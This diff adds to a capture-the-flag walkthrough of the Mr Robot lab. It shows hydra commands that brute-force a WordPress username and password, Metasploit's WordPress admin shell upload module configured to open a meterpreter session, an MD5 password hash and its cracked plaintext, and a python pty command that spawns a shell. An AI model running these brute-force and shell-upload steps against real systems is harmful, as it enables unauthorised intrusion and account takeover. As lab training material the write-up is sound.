@@ -79,8 +79,10 @@ We see 3 important parameters:
 
 Let’s throw this into hydra:
 
-> hydra -L fsocity_filtered.dic -p something 192.168.1.56 http-post-form ‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’
+```bash
 
+hydra -L fsocity_filtered.dic -p something 192.168.1.56 http-post-form ‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’
+```
 
 -   -L fsocity_filtered.dic — Here we will bruteforce the login using our wordlist we found earlier
 -   -p — Here we supply a password, at this stage, we only want the username, so it doesn’t matter what we fill in here
@@ -88,3 +90,77 @@ Let’s throw this into hydra:
 -   http-post-form — The method we’re bruteforcing, in this case, a POST request
 
 ![hydra_username](screenshots/username.png)
+
+**Elliot**  seems to be our username, now let’s do this again but checking for the password. The new hydra command will be:
+
+```bash
+hydra -l elliot -P fsocity_sorted.dic hacknest.net http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit-Log+In:F=is incorrect' 
+```
+![password cracked](screenshots/passwd_crack.png)
+
+
+Now we can leverage the WordPress admin to get a shell on the webserver. For this, we’ll use Metasploit.
+
+### Start the metasploit using following command
+```bash
+msfconsole
+```
+
+#### Search for the wordpress shell exploit and use it
+
+```bash
+msf6 > search wordpress shell
+```
+
+#### Select and copy the following exploit
+```bash
+exploit/unix/webapp/wp_admin_shell_upload
+```
+
+#### Now configure the exploit for target:
+```bash
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.100.4
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28–0652
+
+exploit
+```
+
+#### When I exploit it,I got the following error:
+![wp-error image](screenshots/err.png)
+
+#### The error occured because the WordPress installation isn’t really being used, but still we can get the admin privileges
+
+We can set **wpcheck false** and run the exploit
+
+### Bammm ! we got the meterprter shell and now we have to search for the 2nd flag
+![meterprester session](screenshots/session.png)
+
+
+If we now go to the user’s desktop at /home/robot, we can see the second key there, as well as a file called password.raw-md5.
+
+![shell](screenshots/user.png)
+
+# Phase 4: Privilege Escalation
+
+Looking at the contents of that raw-md5 file, we can indeed see an MD5 hash for the account ‘robot’.
+
+
+> robot:c3fcd3d76192e4007dfb496cca67e13b
+
+#### I cracked the MD5 hash using [CyberChef](https://gchq.github.io/CyberChef/) and [crackstation](https://crackstation.net/)
+
+#### The hash in plain text is **abcdefghijklmnopqrstuvwxyz**
+
+### Now let's try logging in as robot
+### I got the following error:
+![error](screenshots/err2.png)
+
+### Its telling us to start the tty shell, we can start the tty shell using python command as follows:
+
+```python
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
